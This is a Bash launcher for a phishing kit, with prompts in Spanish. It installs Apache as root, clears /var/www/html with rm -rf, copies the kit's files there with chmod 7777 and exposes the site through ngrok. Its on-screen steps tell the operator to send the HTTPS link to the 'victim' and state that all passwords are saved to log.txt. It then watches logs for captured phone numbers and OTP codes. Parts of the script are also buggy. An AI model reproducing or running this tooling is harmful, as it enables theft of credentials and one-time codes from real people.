#!/bin/bash 
 cat Launch.txt
sleep 4
 echo -e "\e[1;31m REQUISITOS: ¡ROOT! ¡INTERNET! ¡SERVIDOR APACHE! \e[0m"
 echo -e "\e[1;37m                   ¡Los desarrolladores no asumen ninguna responsabilidad y no son responsables! \e[0m"



                                      


sleep 6
# spinner
spinlong ()
{
   bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
   barlenght=${#bar}
   i=o
   while ((i < 100 )); do
	   n=$((i*barlenght / 100 ))
	   printf "\e[00;32m\r[%-${barlenght}s]\e[00m" "${bar:0:n}"
	   ((i += RANDOM%5+2))
	   sleep 0.4
   done
}


#clolors
white='\e[1;37m'
green='\e[0;32m'
blue='\e[1;34m'
red='\e[1;31m'
yellow='\e[1;33m' 
  
                 
   echo""
   echo""


                echo -e $green "Ingresar la ruta de Ngrok (p. ej. /root/)"
                read $Path
                sudo apt-get install apache2
	        hostnamectl
                systemctl start apache2
		apt install xterm
		apt install gnome-terminal
		systemctl restart apache2.service
		mkdir /var
		mkdir /var/www
		mkdir /var/www/html
		mv /var/www/html/* /var/www/
		rm -rf /var/www/html/*
		cp -R * /var/www/html/
		cd ..
		cd /var/www/html/
		chmod +x *
		chmod 7777 *
		sleep 6
		
		
		printf "                                \e[210m\e[1;99m ALERTA +++++++++++++++++++++ Paso 1: Enviar enlace Https a la víctima +++++++++++ \e[0m\n"
		printf "                                \e[210m\e[1;99m ALERTA +++++++++++++++++++++ Paso 2: Todas las contraseñas se guardan en /var/www/html/log.txt ++++++++++++++ \e[0m\n"
		sleep 11
		cd $Path
                gnome-terminal -x bash -c "./ngrok http 80; exec bash"
                cd /var/www/html/
		gnome-terminal -x bash -c "tail -f log.txt | grep -e "number"; exec bash"
                gnome-terminal -x bash -c "tail -f logs.txt | grep -e "OTP" -e "otp"; exec bash"
		;;
	        